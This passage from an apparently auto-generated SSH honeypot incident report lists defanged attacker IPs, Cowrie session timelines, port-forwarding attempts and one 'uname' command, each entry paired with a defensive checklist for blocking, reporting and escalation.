- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c59a376c35

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:03 |
| **Last Seen** | 2026-08-23 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:03:07` | `cowrie.session.connect` |
| `2026-08-23 11:03:07` | `cowrie.client.version` |
| `2026-08-23 11:03:07` | `cowrie.client.kex` |
| `2026-08-23 11:03:08` | `cowrie.login.success` |
| `2026-08-23 11:03:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:03:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:03:08` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b188b1e2e6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:03 |
| **Last Seen** | 2026-08-23 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:03:10` | `cowrie.session.connect` |
| `2026-08-23 11:03:10` | `cowrie.client.version` |
| `2026-08-23 11:03:10` | `cowrie.client.kex` |
| `2026-08-23 11:03:11` | `cowrie.login.success` |
| `2026-08-23 11:03:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:03:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:03:12` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-536521963ed1

| Field | Detail |
|---|---|
| **Source IP** | `180.94.74[.]94` |
| **First Seen** | 2026-08-23 11:05 |
| **Last Seen** | 2026-08-23 11:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:05:15` | `cowrie.session.connect` |
| `2026-08-23 11:05:15` | `cowrie.client.version` |
| `2026-08-23 11:05:15` | `cowrie.client.kex` |
| `2026-08-23 11:05:16` | `cowrie.login.success` |
| `2026-08-23 11:05:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.94.74[.]94` to AbuseIPDB if not already reported
- [ ] Block `180.94.74[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60deed85926

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-23 11:10 |
| **Last Seen** | 2026-08-23 11:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:10:05` | `cowrie.session.connect` |
| `2026-08-23 11:10:05` | `cowrie.client.version` |
| `2026-08-23 11:10:05` | `cowrie.client.kex` |
| `2026-08-23 11:10:07` | `cowrie.login.success` |
| `2026-08-23 11:10:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-409e9eada4e1

| Field | Detail |
|---|---|
| **Source IP** | `186.238.89[.]142` |
| **First Seen** | 2026-08-23 11:10 |
| **Last Seen** | 2026-08-23 11:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:10:13` | `cowrie.session.connect` |
| `2026-08-23 11:10:14` | `cowrie.client.version` |
| `2026-08-23 11:10:14` | `cowrie.client.kex` |
| `2026-08-23 11:10:16` | `cowrie.login.success` |
| `2026-08-23 11:10:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:10:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.238.89[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.238.89[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf393b530f8

| Field | Detail |
|---|---|
| **Source IP** | `103.203.74[.]119` |
| **First Seen** | 2026-08-23 11:10 |
| **Last Seen** | 2026-08-23 11:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:10:18` | `cowrie.session.connect` |
| `2026-08-23 11:10:19` | `cowrie.client.version` |
| `2026-08-23 11:10:19` | `cowrie.client.kex` |
| `2026-08-23 11:10:21` | `cowrie.login.success` |
| `2026-08-23 11:10:21` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.203.74[.]119` to AbuseIPDB if not already reported
- [ ] Block `103.203.74[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c7f5ea5912

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:12 |
| **Last Seen** | 2026-08-23 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:12:47` | `cowrie.session.connect` |
| `2026-08-23 11:12:47` | `cowrie.client.version` |
| `2026-08-23 11:12:47` | `cowrie.client.kex` |
| `2026-08-23 11:12:48` | `cowrie.login.success` |
| `2026-08-23 11:12:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:12:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:12:48` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9788e2cb178a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:12 |
| **Last Seen** | 2026-08-23 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:12:51` | `cowrie.session.connect` |
| `2026-08-23 11:12:51` | `cowrie.client.version` |
| `2026-08-23 11:12:51` | `cowrie.client.kex` |
| `2026-08-23 11:12:52` | `cowrie.login.success` |
| `2026-08-23 11:12:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:12:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:12:52` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3c9e369f03

| Field | Detail |
|---|---|
| **Source IP** | `218.59.235[.]170` |
| **First Seen** | 2026-08-23 11:13 |
| **Last Seen** | 2026-08-23 11:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:13:14` | `cowrie.session.connect` |
| `2026-08-23 11:13:15` | `cowrie.client.version` |
| `2026-08-23 11:13:15` | `cowrie.client.kex` |
| `2026-08-23 11:13:18` | `cowrie.login.success` |
| `2026-08-23 11:13:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.59.235[.]170` to AbuseIPDB if not already reported
- [ ] Block `218.59.235[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1c1d047170

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 11:13 |
| **Last Seen** | 2026-08-23 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:13:21` | `cowrie.session.connect` |
| `2026-08-23 11:13:21` | `cowrie.client.version` |
| `2026-08-23 11:13:22` | `cowrie.client.kex` |
| `2026-08-23 11:13:22` | `cowrie.login.success` |
| `2026-08-23 11:13:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:13:22` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d4c5801cb6

| Field | Detail |
|---|---|
| **Source IP** | `103.219.32[.]239` |
| **First Seen** | 2026-08-23 11:17 |
| **Last Seen** | 2026-08-23 11:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:17:13` | `cowrie.session.connect` |
| `2026-08-23 11:17:14` | `cowrie.client.version` |
| `2026-08-23 11:17:14` | `cowrie.client.kex` |
| `2026-08-23 11:17:15` | `cowrie.login.success` |
| `2026-08-23 11:17:16` | `cowrie.session.params` |
| `2026-08-23 11:17:16` | `cowrie.command.input` |
| `2026-08-23 11:17:17` | `cowrie.log.closed` |
| `2026-08-23 11:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.219.32[.]239` to AbuseIPDB if not already reported
- [ ] Block `103.219.32[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bab522750cd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:22 |
| **Last Seen** | 2026-08-23 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:22:14` | `cowrie.session.connect` |
| `2026-08-23 11:22:14` | `cowrie.client.version` |
| `2026-08-23 11:22:14` | `cowrie.client.kex` |
| `2026-08-23 11:22:15` | `cowrie.login.success` |
| `2026-08-23 11:22:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:22:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:22:16` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb4db345ae0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:22 |
| **Last Seen** | 2026-08-23 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:22:18` | `cowrie.session.connect` |
| `2026-08-23 11:22:18` | `cowrie.client.version` |
| `2026-08-23 11:22:18` | `cowrie.client.kex` |
| `2026-08-23 11:22:19` | `cowrie.login.success` |
| `2026-08-23 11:22:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:22:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:22:20` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c903c572d1

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-08-23 11:28 |
| **Last Seen** | 2026-08-23 11:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:28:30` | `cowrie.session.connect` |
| `2026-08-23 11:28:30` | `cowrie.client.version` |
| `2026-08-23 11:28:30` | `cowrie.client.kex` |
| `2026-08-23 11:28:32` | `cowrie.login.success` |
| `2026-08-23 11:28:32` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952fe92c1822

| Field | Detail |
|---|---|
| **Source IP** | `183.223.156[.]154` |
| **First Seen** | 2026-08-23 11:28 |
| **Last Seen** | 2026-08-23 11:28 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:28:38` | `cowrie.session.connect` |
| `2026-08-23 11:28:39` | `cowrie.client.version` |
| `2026-08-23 11:28:39` | `cowrie.client.kex` |
| `2026-08-23 11:28:43` | `cowrie.login.success` |
| `2026-08-23 11:28:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.223.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.223.156[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ef594f7bf9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:31 |
| **Last Seen** | 2026-08-23 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:31:50` | `cowrie.session.connect` |
| `2026-08-23 11:31:50` | `cowrie.client.version` |
| `2026-08-23 11:31:50` | `cowrie.client.kex` |
| `2026-08-23 11:31:51` | `cowrie.login.success` |
| `2026-08-23 11:31:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:31:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:31:51` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ea1e6469bd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:31 |
| **Last Seen** | 2026-08-23 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:31:54` | `cowrie.session.connect` |
| `2026-08-23 11:31:54` | `cowrie.client.version` |
| `2026-08-23 11:31:54` | `cowrie.client.kex` |
| `2026-08-23 11:31:55` | `cowrie.login.success` |
| `2026-08-23 11:31:55` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:31:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:31:56` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85eaa5eeb1a1

| Field | Detail |
|---|---|
| **Source IP** | `121.167.89[.]157` |
| **First Seen** | 2026-08-23 11:33 |
| **Last Seen** | 2026-08-23 11:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:33:02` | `cowrie.session.connect` |
| `2026-08-23 11:33:03` | `cowrie.client.version` |
| `2026-08-23 11:33:03` | `cowrie.client.kex` |
| `2026-08-23 11:33:05` | `cowrie.login.success` |
| `2026-08-23 11:33:06` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.167.89[.]157` to AbuseIPDB if not already reported
- [ ] Block `121.167.89[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87cdee3d6c5c

| Field | Detail |
|---|---|
| **Source IP** | `219.78.240[.]92` |
| **First Seen** | 2026-08-23 11:37 |
| **Last Seen** | 2026-08-23 11:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:37:44` | `cowrie.session.connect` |
| `2026-08-23 11:37:46` | `cowrie.client.version` |
| `2026-08-23 11:37:46` | `cowrie.client.kex` |
| `2026-08-23 11:37:48` | `cowrie.login.success` |
| `2026-08-23 11:37:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.78.240[.]92` to AbuseIPDB if not already reported
- [ ] Block `219.78.240[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f091261ac2e4

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-08-23 11:37 |
| **Last Seen** | 2026-08-23 11:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:37:53` | `cowrie.session.connect` |
| `2026-08-23 11:37:54` | `cowrie.client.version` |
| `2026-08-23 11:37:54` | `cowrie.client.kex` |
| `2026-08-23 11:37:56` | `cowrie.login.success` |
| `2026-08-23 11:37:56` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd6d120d463

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:41 |
| **Last Seen** | 2026-08-23 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:41:22` | `cowrie.session.connect` |
| `2026-08-23 11:41:22` | `cowrie.client.version` |
| `2026-08-23 11:41:22` | `cowrie.client.kex` |
| `2026-08-23 11:41:23` | `cowrie.login.success` |
| `2026-08-23 11:41:23` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:41:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:41:23` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f61283355b5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 11:41 |
| **Last Seen** | 2026-08-23 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:41:25` | `cowrie.session.connect` |
| `2026-08-23 11:41:25` | `cowrie.client.version` |
| `2026-08-23 11:41:25` | `cowrie.client.kex` |
| `2026-08-23 11:41:26` | `cowrie.login.success` |
| `2026-08-23 11:41:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:41:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 11:41:27` | `cowrie.direct-tcpip.data` |
| `2026-08-23 11:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5ec2a7f226

| Field | Detail |
|---|---|
| **Source IP** | `65.20.165[.]78` |
| **First Seen** | 2026-08-23 11:42 |
| **Last Seen** | 2026-08-23 11:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:42:30` | `cowrie.session.connect` |
| `2026-08-23 11:42:31` | `cowrie.client.version` |
| `2026-08-23 11:42:31` | `cowrie.client.kex` |
| `2026-08-23 11:42:32` | `cowrie.login.success` |
| `2026-08-23 11:42:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.165[.]78` to AbuseIPDB if not already reported
- [ ] Block `65.20.165[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f09d44a4643

| Field | Detail |
|---|---|
| **Source IP** | `182.95.180[.]82` |
| **First Seen** | 2026-08-23 11:42 |
| **Last Seen** | 2026-08-23 11:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 11:42:38` | `cowrie.session.connect` |
| `2026-08-23 11:42:38` | `cowrie.client.version` |
| `2026-08-23 11:42:38` | `cowrie.client.kex` |
| `2026-08-23 11:42:40` | `cowrie.login.success` |
| `2026-08-23 11:42:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 11:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.180[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.95.180[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8a496abf2eb

| Field | Detail |
|---|---|
| **Source IP** | `222.76.248[.]54` |
| **First Seen** | 2026-08-23 11:42 |
